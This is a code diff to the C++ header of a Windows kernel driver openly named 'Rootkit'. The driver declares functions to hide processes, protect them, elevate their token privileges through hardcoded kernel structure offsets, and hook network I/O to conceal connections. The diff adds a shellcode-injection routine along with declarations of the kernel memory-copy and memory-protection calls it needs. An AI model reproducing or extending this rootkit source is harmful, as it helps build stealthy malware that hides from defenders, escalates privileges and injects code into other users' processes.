@@ -6,10 +6,10 @@
 
 #define ACTIVE_PROCESS_LINKS 0x448
 #define TOKEN 0x4b8
+
 #define UMAX 65535
 
 struct NetInfo {
-	ULONG IP[UMAX];
 	USHORT LTCP[UMAX];
 	USHORT RTCP[UMAX];
 	USHORT UDP[UMAX];
@@ -21,11 +21,18 @@ struct NetInfo {
 	}
 };
 
+struct Shell {
+	UINT32 pid;
+	unsigned char* shellcode;
+	UINT32 size;
+};
+
 namespace Rootkit
 {
 	NTSTATUS ProtectProcess(UINT32 PID);
 	PCHAR HideProc(UINT32 PID);
 	NTSTATUS ProcessElevation(UINT32 PID);
+	PVOID InjectShellcode(Shell* shell);
 
 	namespace NetHook
 	{
@@ -37,6 +44,12 @@ namespace Rootkit
 		NTSTATUS HookDeviceIo(PDEVICE_OBJECT DeviceObject, PIRP pIrp);
 		VOID UnloadHook();
 	}
+
+	extern "C"
+		NTSTATUS PsLookupProcessByProcessId(
+			HANDLE ProcessId,
+			PEPROCESS* Process
+		);
 
 	extern "C"
 		NTSYSAPI NTSTATUS NTAPI ZwSetInformationProcess(
@@ -55,11 +68,32 @@ namespace Rootkit
 			_Out_writes_bytes_to_opt_(BufferLength, *ReturnLength) PTOKEN_PRIVILEGES PreviousState,
 			_When_(PreviousState != NULL, _Out_) PULONG ReturnLength
 		);
+
+	extern "C"
+		NTSTATUS NTAPI MmCopyVirtualMemory
+		(
+			PEPROCESS SourceProcess,
+			PVOID SourceAddress,
+			PEPROCESS TargetProcess,
+			PVOID TargetAddress,
+			SIZE_T BufferSize,
+			KPROCESSOR_MODE PreviousMode,
+			PSIZE_T ReturnSize
+		);
+
+	extern "C"
+		NTSTATUS NTAPI ZwProtectVirtualMemory
+		(
+			IN HANDLE ProcessHandle,
+			IN PVOID * BaseAddress,
+			IN SIZE_T * NumberOfBytesToProtect,
+			IN ULONG NewAccessProtection,
+			OUT PULONG OldAccessProtection
+		);
 }
 
 namespace Utils
 {
-	BOOLEAN FindIP(ULONG IP);
 	BOOLEAN FindLTCP(USHORT LTCP);
 	BOOLEAN FindRTCP(USHORT RTCP);
 	BOOLEAN FindUDP(USHORT UDP);
